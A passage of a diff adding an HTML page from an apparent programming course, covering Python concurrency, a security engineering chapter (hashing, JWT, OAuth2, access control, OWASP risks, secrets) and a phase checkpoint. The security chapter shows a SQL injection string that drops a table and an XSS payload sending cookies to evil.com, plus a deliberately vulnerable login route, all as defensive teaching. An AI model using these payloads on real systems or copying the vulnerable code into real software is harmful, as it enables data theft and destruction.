+<pre style="overflow-x:auto"><code>lock = threading.Lock()
+counter = 0
+
+def safe_increment():
+    global counter
+    for _ in range(100000):
+        with lock:  # Only one thread at a time
+            counter += 1</code></pre>
+
+<h3>Async/Await</h3>
+
+<p><strong>Async/await</strong> is Python&rsquo;s system for cooperative multitasking. A <strong>coroutine</strong> (defined with <code>async def</code>) can pause with <code>await</code> while waiting for I/O, letting other coroutines run on the same thread.</p>
+
+<pre style="overflow-x:auto"><code>import asyncio
+
+async def fetch_task(task_id):
+    print(f"Fetching task {task_id}...")
+    await asyncio.sleep(1)  # Non-blocking wait
+    print(f"Got task {task_id}")
+    return {"id": task_id, "title": f"Task {task_id}"}
+
+async def main():
+    # All three start concurrently, wait together
+    results = await asyncio.gather(
+        fetch_task(1),
+        fetch_task(2),
+        fetch_task(3),
+    )
+    # ~1 second total, not 3!
+    print(f"Got {len(results)} tasks")
+
+# asyncio.run(main())  # Starts the event loop</code></pre>
+
+<p>The <strong>event loop</strong> manages all running coroutines. When one hits <code>await</code>, it yields control back to the loop, which runs other ready coroutines.</p>
+
+<h3>Multiprocessing</h3>
+
+<p>For CPU-bound work, <code>multiprocessing</code> spawns separate Python processes, each with its own GIL. True parallelism on multiple cores.</p>
+
+<pre style="overflow-x:auto"><code>from multiprocessing import Pool
+
+def process_image(path):
+    """CPU-heavy image processing."""
+    # ... computation ...
+    return f"Processed {path}"
+
+# Process 8 images across 4 CPU cores
+with Pool(processes=4) as pool:
+    results = pool.map(process_image, [
+        "img1.png", "img2.png", "img3.png", "img4.png",
+        "img5.png", "img6.png", "img7.png", "img8.png",
+    ])
+# ~2x faster than sequential on 4 cores</code></pre>
+
+<h3>Common Concurrency Bugs</h3>
+
+<p><strong>Race condition:</strong> Two threads read-modify-write the same data, and interleaving produces an incorrect result. Fix: use locks or atomic operations.</p>
+
+<p><strong>Deadlock:</strong> Thread A holds Lock 1 and waits for Lock 2. Thread B holds Lock 2 and waits for Lock 1. Fix: always acquire locks in the same global order.</p>
+
+<p><strong>Starvation:</strong> A thread never gets access to a resource because others keep taking it first. Fix: use fair locks or priority queues.</p>
+
+<p><strong>Thundering herd:</strong> Many threads wake simultaneously to compete for one resource (e.g., a cache expires and 1000 requests all regenerate it). Fix: single-flight pattern &mdash; one thread regenerates, others wait for its result.</p>
+
+<h3>Patterns</h3>
+
+<h4>Producer/Consumer</h4>
+
+<p>Producers add work items to a queue; consumers process them. The queue decouples production from consumption.</p>
+
+<pre style="overflow-x:auto"><code>import queue
+import threading
+
+work_queue = queue.Queue()
+
+def producer():
+    for i in range(10):
+        work_queue.put(f"task-{i}")
+    work_queue.put(None)  # Sentinel: signals completion
+
+def consumer():
+    while True:
+        item = work_queue.get()
+        if item is None:
+            break
+        print(f"Processing {item}")
+        work_queue.task_done()</code></pre>
+
+<h4>Thread Pool</h4>
+
+<p>Instead of creating a thread per task, reuse a fixed pool. Python&rsquo;s <code>concurrent.futures.ThreadPoolExecutor</code> provides this.</p>
+
+<pre style="overflow-x:auto"><code>from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def fetch_url(url):
+    import time
+    time.sleep(0.5)
+    return f"Content from {url}"
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    futures = {executor.submit(fetch_url, u): u
+               for u in ["url1", "url2", "url3", "url4", "url5"]}
+
+    for future in as_completed(futures):
+        url = futures[future]
+        print(f"{url}: {future.result()}")</code></pre>
+
+<h4>Fan-Out / Fan-In</h4>
+
+<p><strong>Fan-out:</strong> split a task into many parallel subtasks. <strong>Fan-in:</strong> collect and combine the results. This is the pattern behind map-reduce, parallel web scraping, and batch processing.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Design how TaskForge&rsquo;s API server could use concurrency. Flask&rsquo;s development server handles one request at a time. In production, Gunicorn spawns multiple worker processes (multiprocessing). For &ldquo;export all tasks as PDF,&rdquo; you might use a background thread pool. Sketch which concurrency model fits each scenario.</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Micro-Exercise: Match the Concurrency Model</div>
+<p>For each scenario, pick the best model:</p>
+<ul>
+<li>Downloading 50 files from the internet simultaneously &rarr; <strong>async or threading</strong></li>
+<li>Resizing 200 high-resolution photos &rarr; <strong>multiprocessing</strong></li>
+<li>A chat server with 10,000 connections &rarr; <strong>async</strong></li>
+<li>A scraper that fetches pages and parses HTML &rarr; <strong>async for fetching + multiprocessing for heavy parsing</strong></li>
+</ul>
+</div>
+
+<!-- Ch32 Quiz: GIL -->
+<div class="quiz" data-ch="32" data-ex="gil-bypass">
+  <h4>Knowledge Check</h4>
+  <p>Which Python concurrency model bypasses the GIL to achieve true parallelism for CPU-bound work?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">threading</button>
+    <button class="quiz-option" data-correct="false">asyncio</button>
+    <button class="quiz-option" data-correct="true">multiprocessing</button>
+    <button class="quiz-option" data-correct="false">concurrent.futures.ThreadPoolExecutor</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Quiz: Deadlock -->
+<div class="quiz" data-ch="32" data-ex="deadlock-cause">
+  <h4>Knowledge Check</h4>
+  <p>What causes a deadlock?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">A thread runs an infinite loop consuming 100% CPU</button>
+    <button class="quiz-option" data-correct="true">Two threads each hold a lock the other needs, so both wait forever</button>
+    <button class="quiz-option" data-correct="false">A thread forgets to release a lock after acquiring it</button>
+    <button class="quiz-option" data-correct="false">Too many threads compete for the same resource simultaneously</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Checklist -->
+<div class="checklist" data-ch="32" data-ex="concurrency-understanding">
+  <h4>Concurrency Understanding Checklist</h4>
+  <label><input type="checkbox"><span>I can explain the difference between concurrency and parallelism</span></label>
+  <label><input type="checkbox"><span>I know what the GIL is and how it affects Python threading</span></label>
+  <label><input type="checkbox"><span>I can choose between threading, async, and multiprocessing for a given workload</span></label>
+  <label><input type="checkbox"><span>I can describe what a race condition is and how locks prevent it</span></label>
+  <label><input type="checkbox"><span>I can explain the producer/consumer pattern</span></label>
+  <label><input type="checkbox"><span>I understand why deadlocks happen and how to prevent them</span></label>
+  <label><input type="checkbox"><span>I know when async/await is better than threading</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 33 ===== -->
+<section id="ch33" data-ch="33">
+<h2><span class="ch-label">Chapter 33</span> Security Engineering</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>Every web application is a target. SQL injection, stolen passwords, leaked API keys &mdash; these happen every day. Security is not something you bolt on at the end; it is a mindset woven into every line of code. This chapter teaches you to think like an attacker so you can defend like an engineer.</p>
+</div>
+
+<h3>Authentication &mdash; Who Are You?</h3>
+
+<p><strong>Authentication</strong> verifies someone&rsquo;s identity. The most common form is username + password.</p>
+
+<h4>Password Hashing</h4>
+
+<p>Rule number one: <strong>never store passwords in plaintext</strong>. If your database is breached, every user&rsquo;s password is exposed. Instead, store a <strong>hash</strong> &mdash; a one-way mathematical fingerprint.</p>
+
+<pre style="overflow-x:auto"><code>import hashlib
+import os
+
+def hash_password(password, salt=None):
+    """Hash a password with a random salt."""
+    if salt is None:
+        salt = os.urandom(16)
+    hashed = hashlib.pbkdf2_hmac(
+        'sha256',
+        password.encode('utf-8'),
+        salt,
+        iterations=100000  # Slow on purpose!
+    )
+    return salt, hashed
+
+def verify_password(password, salt, stored_hash):
+    """Verify a password against a stored hash."""
+    _, new_hash = hash_password(password, salt)
+    return new_hash == stored_hash
+
+# Registration
+salt, hashed = hash_password("my_secret_password")
+# Store salt + hashed in database (NOT the plaintext password!)
+
+# Login
+is_valid = verify_password("my_secret_password", salt, hashed)  # True</code></pre>
+
+<p>Key concepts:</p>
+<ul>
+<li><strong>Salt:</strong> A random value added to each password before hashing. Even if two users have the same password, their hashes differ. Also defeats rainbow tables (precomputed hash lookups).</li>
+<li><strong>Slow hashing:</strong> Algorithms like bcrypt, scrypt, and PBKDF2 are intentionally slow. This makes brute-force attacks impractical: hashing one guess takes milliseconds, but billions of guesses take years.</li>
+<li><strong>Hashing is NOT encryption:</strong> Encryption is reversible (decrypt with a key). Hashing is one-way (you cannot recover the original).</li>
+</ul>
+
+<h4>JWT Tokens</h4>
+
+<p><strong>JSON Web Tokens (JWT)</strong> are a compact way to transmit authentication information. A JWT has three base64-encoded parts: <code>header.payload.signature</code>.</p>
+
+<pre style="overflow-x:auto"><code># Conceptual JWT structure
+# Header:    {"alg": "HS256", "typ": "JWT"}
+# Payload:   {"user_id": 42, "role": "admin", "exp": 1711324800}
+# Signature: HMAC-SHA256(header + "." + payload, secret_key)
+
+# Server creates JWT after login:
+# token = jwt.encode({"user_id": 42, "exp": ...}, SECRET, algorithm="HS256")
+
+# Client sends in Authorization header:
+# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+# Server verifies on each request:
+# data = jwt.decode(token, SECRET, algorithms=["HS256"])</code></pre>
+
+<h4>OAuth2 Flow</h4>
+
+<p><strong>OAuth2</strong> lets users log into your app using existing accounts (Google, GitHub) without sharing their password with you.</p>
+
+<!-- OAuth2 SVG Diagram -->
+<svg viewBox="0 0 720 330" aria-label="OAuth2 authorisation code flow showing user visiting app, redirect to auth server, user login, callback with code, code exchange for token, then token used for API access" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="10" y="15" width="120" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="70" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">User</text>
+
+  <rect x="290" y="15" width="140" height="42" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="360" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Your App</text>
+
+  <rect x="580" y="15" width="130" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="645" y="36" class="label-text" text-anchor="middle" font-size="12" font-weight="600">Auth Server</text>
+  <text x="645" y="51" class="sub-text" text-anchor="middle" font-size="9">(Google, GitHub)</text>
+
+  <line x1="130" y1="80" x2="290" y2="80" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="74" class="sub-text" text-anchor="middle" font-size="10">1. Click &ldquo;Login with Google&rdquo;</text>
+
+  <line x1="430" y1="100" x2="580" y2="100" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="94" class="sub-text" text-anchor="middle" font-size="10">2. Redirect to login page</text>
+
+  <line x1="580" y1="130" x2="130" y2="130" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <text x="355" y="124" class="sub-text" text-anchor="middle" font-size="10">3. User enters credentials at auth server</text>
+
+  <line x1="580" y1="165" x2="430" y2="165" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="159" class="sub-text" text-anchor="middle" font-size="10">4. Callback with auth code</text>
+
+  <line x1="430" y1="198" x2="580" y2="198" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="192" class="sub-text" text-anchor="middle" font-size="10">5. Exchange code for token</text>
+
+  <line x1="580" y1="228" x2="430" y2="228" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="222" class="sub-text" text-anchor="middle" font-size="10">6. Access token returned</text>
+
+  <line x1="430" y1="260" x2="580" y2="260" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="254" class="sub-text" text-anchor="middle" font-size="10">7. Use token to get user data</text>
+
+  <line x1="290" y1="290" x2="130" y2="290" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="284" class="sub-text" text-anchor="middle" font-size="10">8. User is logged in!</text>
+
+  <text x="360" y="322" class="sub-text" text-anchor="middle" font-size="10">Your app never sees the user&rsquo;s Google/GitHub password</text>
+</svg>
+
+<h3>Authorisation &mdash; What Can You Do?</h3>
+
+<p>Authentication = &ldquo;who are you?&rdquo; <strong>Authorisation</strong> = &ldquo;what are you allowed to do?&rdquo;</p>
+
+<h4>Role-Based Access Control (RBAC)</h4>
+
+<p>Users are assigned <strong>roles</strong> (admin, editor, viewer). Each role has specific permissions.</p>
+
+<pre style="overflow-x:auto"><code>PERMISSIONS = {
+    "admin":  ["create", "read", "update", "delete", "manage_users"],
+    "editor": ["create", "read", "update"],
+    "viewer": ["read"],
+}
+
+def check_permission(user_role, action):
+    allowed = PERMISSIONS.get(user_role, [])
+    if action not in allowed:
+        raise PermissionError(f"Role '{user_role}' cannot '{action}'")</code></pre>
+
+<h4>Attribute-Based Access Control (ABAC)</h4>
+
+<p><strong>ABAC</strong> makes decisions based on multiple attributes: the user&rsquo;s department, the resource&rsquo;s classification, the time of day.</p>
+
+<pre style="overflow-x:auto"><code>def can_access_task(user, task):
+    """ABAC: access depends on multiple attributes."""
+    if user.role == "admin":
+        return True
+    if task.project_id in user.project_ids:
+        return True
+    if task.is_public:
+        return True
+    return False</code></pre>
+
+<p>The <strong>Principle of Least Privilege</strong>: give every user, process, and component only the minimum permissions needed. An API that only reads tasks should not have write access.</p>
+
+<h3>Encryption</h3>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Encryption types and when to use them</caption>
+<thead><tr><th>Type</th><th>Keys</th><th>Speed</th><th>Use Case</th></tr></thead>
+<tbody>
+<tr><td><strong>Symmetric</strong> (AES)</td><td>One shared key</td><td>Fast</td><td>Data at rest, VPNs</td></tr>
+<tr><td><strong>Asymmetric</strong> (RSA)</td><td>Public + private pair</td><td>Slow</td><td>TLS handshakes, signatures</td></tr>
+<tr><td><strong>Hashing</strong> (SHA-256)</td><td>No key (one-way)</td><td>Fast</td><td>Passwords, data integrity</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">Myth: Hashing Is a Form of Encryption</div>
+<p>Encryption is reversible &mdash; you can decrypt with the right key. Hashing is one-way &mdash; you <strong>cannot</strong> recover the original. Hash passwords (you only need to verify them). Encrypt sensitive data like credit card numbers (you <em>do</em> need to read them later).</p>
+</div>
+
+<h3>OWASP Top Vulnerabilities</h3>
+
+<p>The OWASP (Open Web Application Security Project) maintains a list of the most critical web security risks. Here are the top five you must understand.</p>
+
+<h4>1. SQL Injection</h4>
+
+<p>An attacker inserts malicious SQL into an input field. If you build SQL by concatenating strings, the attacker can read, modify, or delete your entire database.</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: string concatenation
+username = "admin'; DROP TABLE users; --"
+query = f"SELECT * FROM users WHERE username = '{username}'"
+# Becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
+# Your entire users table is deleted!
+
+# SAFE: parameterised query
+cursor.execute(
+    "SELECT * FROM users WHERE username = ?",
+    (username,)
+)
+# The ? placeholder treats input as DATA, not SQL code</code></pre>
+
+<h4>2. Broken Authentication</h4>
+
+<p>Weak passwords, missing rate limiting, tokens that never expire, insecure password reset flows. Fix: enforce strong passwords, use MFA, expire tokens, rate-limit login attempts.</p>
+
+<h4>3. Cross-Site Scripting (XSS)</h4>
+
+<p>An attacker injects JavaScript into a page other users view. The script runs in the victim&rsquo;s browser, stealing cookies or session tokens.</p>
+
+<pre style="overflow-x:auto"><code># VULNERABLE: user input directly in HTML
+task_title = '&lt;script&gt;document.location="https://evil.com/?c="+document.cookie&lt;/script&gt;'
+html = f"&lt;h1&gt;{task_title}&lt;/h1&gt;"
+# The script executes in every viewer's browser!
+
+# SAFE: output encoding (escape HTML characters)
+from markupsafe import escape
+html = f"&lt;h1&gt;{escape(task_title)}&lt;/h1&gt;"
+# Renders as visible text, not executable code</code></pre>
+
+<h4>4. Server-Side Request Forgery (SSRF)</h4>
+
+<p>An attacker tricks your server into making requests to internal services. If your app fetches user-supplied URLs, an attacker might provide <code>http://localhost:5432</code> to probe your internal network. Fix: validate and allowlist URLs, block internal IP ranges.</p>
+
+<h4>5. Security Misconfiguration</h4>
+
+<p>Default passwords left unchanged, debug mode enabled in production, verbose stack traces shown to users, unnecessary services exposed. Fix: harden defaults, audit configurations, never expose debug info.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>OWASP Top 10 vulnerabilities 6-10 with quick fixes</caption>
+<thead><tr><th>#</th><th>Vulnerability</th><th>Quick Fix</th></tr></thead>
+<tbody>
+<tr><td>6</td><td>Vulnerable &amp; Outdated Components</td><td>Audit dependencies regularly (<code>pip audit</code>)</td></tr>
+<tr><td>7</td><td>Identification &amp; Auth Failures</td><td>MFA, rate limiting, secure sessions</td></tr>
+<tr><td>8</td><td>Software &amp; Data Integrity Failures</td><td>Verify downloads, use signed packages</td></tr>
+<tr><td>9</td><td>Security Logging &amp; Monitoring Failures</td><td>Log auth events, alert on anomalies</td></tr>
+<tr><td>10</td><td>Insecure Design</td><td>Threat model during design, not after deploy</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>Secure Coding Practices</h3>
+
+<ul>
+<li><strong>Input validation:</strong> Validate every input on the server. Client-side validation is UX; server-side is security. Never trust the client.</li>
+<li><strong>Parameterised queries:</strong> Always. No exceptions. Every SQL query with user input must use placeholders.</li>
+<li><strong>Output encoding:</strong> Encode all user-generated content before rendering in HTML to prevent XSS.</li>
+<li><strong>Dependency auditing:</strong> Regularly scan dependencies for vulnerabilities. Use <code>pip audit</code> or GitHub Dependabot.</li>
+</ul>
+
+<h3>Secrets Management</h3>
+
+<p><strong>Never commit credentials to version control.</strong> Not even once, not even temporarily. Git history is permanent &mdash; even after deletion, the secret lives in the history.</p>
+
+<pre style="overflow-x:auto"><code># BAD: hardcoded secret
+API_KEY = "sk-live-abc123def456"
+
+# GOOD: environment variable
+import os
+API_KEY = os.environ.get("API_KEY")
+if not API_KEY:
+    raise RuntimeError("API_KEY not set")
+
+# BETTER: .env file (not committed) with python-dotenv
+# .env file (in .gitignore):
+# API_KEY=sk-live-abc123def456
+
+from dotenv import load_dotenv
+load_dotenv()
+API_KEY = os.environ["API_KEY"]</code></pre>
+
+<p>For production, use a dedicated secret store: AWS Secrets Manager, HashiCorp Vault, or your platform&rsquo;s built-in secret management.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Add authentication to TaskForge: implement password hashing with PBKDF2, create login/register endpoints returning JWT tokens, add a decorator checking the token on protected routes, and implement RBAC with at least &ldquo;admin&rdquo; and &ldquo;viewer&rdquo; roles. Then audit every SQL query &mdash; replace any string concatenation with parameterised queries.</p>
+</div>
+
+<div class="pq">"Security is a process, not a product." &mdash; Bruce Schneier</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Try This Now &mdash; Find the Vulnerabilities</div>
+<p>Identify all security issues in this code:</p>
+<pre style="overflow-x:auto"><code>@app.route("/login", methods=["POST"])
+def login():
+    username = request.form["username"]
+    password = request.form["password"]
+    user = db.execute(
+        f"SELECT * FROM users WHERE username = '{username}'"
+    ).fetchone()
+    if user and user["password"] == password:
+        session["user"] = username
+        return "Login successful"
+    return "Invalid credentials"</code></pre>
+<p>Issues: (1) SQL injection via f-string, (2) plaintext password comparison, (3) no rate limiting, (4) no CSRF protection. How would you fix each?</p>
+</div>
+
+<!-- Ch33 Quiz -->
+<div class="quiz" data-ch="33" data-ex="sql-injection">
+  <h4>Knowledge Check</h4>
+  <p>Which of these is a SQL injection vulnerability?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = ?", (task_id,))</code></button>
+    <button class="quiz-option" data-correct="true"><code>cursor.execute(f"SELECT * FROM tasks WHERE id = {task_id}")</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = :id", {"id": task_id})</code></button>
+    <button class="quiz-option" data-correct="false"><code>cursor.execute("SELECT * FROM tasks WHERE id = %s", (task_id,))</code></button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch33 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="33" data-ex="password-hashing">
+  <div class="exercise-header">
+    <h4>Exercise: Password Hashing</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Implement password hashing using <code>hashlib</code>. Complete <code>hash_password(password, salt)</code> using PBKDF2 with SHA-256 and 100,000 iterations. Then complete <code>verify_password(password, salt, expected_hash)</code> that returns True only if the password matches. Demonstrate that different salts produce different hashes.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import hashlib
+
+def hash_password(password, salt):
+    """Hash a password with the given salt using PBKDF2-SHA256.
+    Args:
+        password: str - the plaintext password
+        salt: bytes - the salt value
+    Returns:
+        bytes - the derived key (hash)
+    """
+    # TODO: use hashlib.pbkdf2_hmac with 'sha256', 100000 iterations
+    pass
+
+def verify_password(password, salt, expected_hash):
+    """Return True if password matches the expected hash."""
+    # TODO: hash the password and compare
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test basic hashing
+salt1 = b"salt_value_one__"
+hash1 = hash_password("my_password", salt1)
+assert hash1 is not None, "hash_password returned None"
+assert isinstance(hash1, bytes), "hash_password should return bytes"
+assert len(hash1) == 32, f"SHA-256 produces 32 bytes, got {len(hash1)}"
+
+# Test consistency
+hash1_again = hash_password("my_password", salt1)
+assert hash1 == hash1_again, "Same password+salt must produce same hash"
+
+# Test different salts produce different hashes
+salt2 = b"different_salt!!"
+hash2 = hash_password("my_password", salt2)
+assert hash1 != hash2, "Different salts must produce different hashes"
+
+# Test different passwords produce different hashes
+hash3 = hash_password("other_password", salt1)
+assert hash1 != hash3, "Different passwords must produce different hashes"
+
+# Test verify_password
+assert verify_password("my_password", salt1, hash1) == True, "Correct password should verify"
+assert verify_password("wrong_password", salt1, hash1) == False, "Wrong password should fail"
+assert verify_password("my_password", salt2, hash1) == False, "Wrong salt should fail"
+
+print("All password hashing tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">Run</button>
+    <button class="ex-check">Check</button>
+    <button class="ex-hint" data-level="0">Hint</button>
+    <button class="ex-reset">Reset</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">Use <code>hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)</code> to create the hash.</p>
+    <p class="hint">For verify_password, call hash_password with the given password and salt, then compare the result to expected_hash. Return True if they match.</p>
+    <p class="hint">Remember to encode the password string to bytes: <code>password.encode('utf-8')</code>. The salt is already bytes.</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== Phase 7 Gate ===== -->
+<section id="gate7">
+<h2><span class="ch-label">Phase 7 Gate</span> Checkpoint &amp; TaskForge Engineering</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Minimum Competency</div>
+<p>Before moving to Phase 8, you must demonstrate all of the following. These are not optional &mdash; skipping them will leave gaps that Phase 8 assumes you have filled.</p>
+</div>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Phase 7 gate: required skills and demonstrations</caption>
+<thead><tr><th>Skill</th><th>How to Demonstrate</th></tr></thead>
+<tbody>
+<tr><td>Apply SOLID principles</td><td>Refactor a class violating SRP into focused components</td></tr>
+<tr><td>Use the Strategy pattern</td><td>Swap TaskForge storage backends without changing business logic</td></tr>
+<tr><td>Write complex SQL</td><td>JOINs, window functions, CTEs that produce correct results</td></tr>
+<tr><td>Optimise queries</td><td>Read EXPLAIN output, add indexes, fix an N+1 query</td></tr>
+<tr><td>Handle transactions</td><td>Demonstrate rollback on failure; explain isolation levels</td></tr>
+<tr><td>Explain networking</td><td>Trace an HTTP request through DNS, TCP, TLS, application layers</td></tr>
+<tr><td>Choose concurrency models</td><td>Match workloads to threading, async, or multiprocessing</td></tr>
+<tr><td>Implement authentication</td><td>Hash passwords, verify credentials, issue tokens</td></tr>
+<tr><td>Prevent OWASP Top 5</td><td>Identify and fix SQL injection, XSS, broken auth in code</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>Your Artifact: TaskForge Engineering Upgrade</h3>
+
+<p>Apply the skills from this phase to TaskForge in a single focused sprint:</p>
+
+<ol>
+<li><strong>Design Patterns:</strong> Refactor TaskForge to use the Strategy pattern for storage backends (at least two: SQLite and in-memory for testing). Apply dependency injection so TaskManager receives its backend via the constructor.</li>
+<li><strong>Database Optimisation:</strong> Add indexes to the TaskForge database. Run EXPLAIN on your three most common queries and verify they use the indexes. Fix any N+1 queries in your API routes.</li>
+<li><strong>Authentication &amp; Security:</strong> Add password hashing (PBKDF2 or bcrypt). Create login/register endpoints. Add token-based auth to all protected routes. Implement RBAC with at least &ldquo;admin&rdquo; and &ldquo;viewer&rdquo; roles. Audit all SQL queries for parameterised statements.</li>
+<li><strong>Transactions:</strong> Wrap multi-step operations (like &ldquo;move task between projects&rdquo;) in transactions with proper rollback on failure.</li>
+</ol>
+
+<div role="note" class="callout warn">
+<div class="callout-title">Failure Signal</div>
+<p>If you cannot explain the Strategy pattern and implement a basic version, or if you cannot write a JOIN query or identify a SQL injection vulnerability &mdash; stop and revisit the relevant chapter. These are foundational skills for everything that follows.</p>
+</div>
+
+<h3>What You Can Now Do</h3>
+
+<ul>
+<li>Organise code using established design patterns that make systems extensible</li>
+<li>Write complex, efficient SQL queries and understand why they perform the way they do</li>
+<li>Protect data integrity with transactions and choose the right isolation level</li>
+<li>Explain how the internet works from DNS to HTTP response</li>
+<li>Choose the right concurrency model for any workload and avoid common bugs</li>
+<li>Build secure applications that resist the most common attack vectors</li>
+</ul>
+
+<div role="note" class="callout info">
+<div class="callout-title">Bridge to Phase 8: Systems &amp; Scale</div>
+<p>You can now build secure, well-structured, database-backed applications. Phase 8 zooms out further: how do you design systems that handle millions of users? How do distributed systems stay consistent? How do you measure and improve performance? The engineering craft you learned here is the foundation for thinking at system scale.</p>
+</div>
+
+</section>
+
+<nav class="phase-nav">
+  <a href="phase-6.html" class="phase-nav-link prev"><span class="phase-nav-label">Previous Phase</span>&larr; Phase 6: Algorithms</a>
+  <a href="phase-8.html" class="phase-nav-link next"><span class="phase-nav-label">Next Phase</span>Phase 8: Systems &amp; Scale &rarr;</a>
+</nav>
+
+</div>
+</div>
+
+<footer>
+<p>Zero to Hero: Programming to Multi-Agent Claude Code &middot; March 2026</p>
+</footer>
+
+<script src="js/progress.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.36.5/src-min-noconflict/ace.js"></script>
+<script src="js/theme.js"></script>
+<script src="js/sidebar.js"></script>
+<script src="js/shared.js"></script>
+<script src="js/ace-init.js"></script>
+<script src="js/pyodide-runner.js"></script>
+<script src="js/quiz.js"></script>
+<script src="js/exercise-runner.js"></script>
+</body>
+</html>
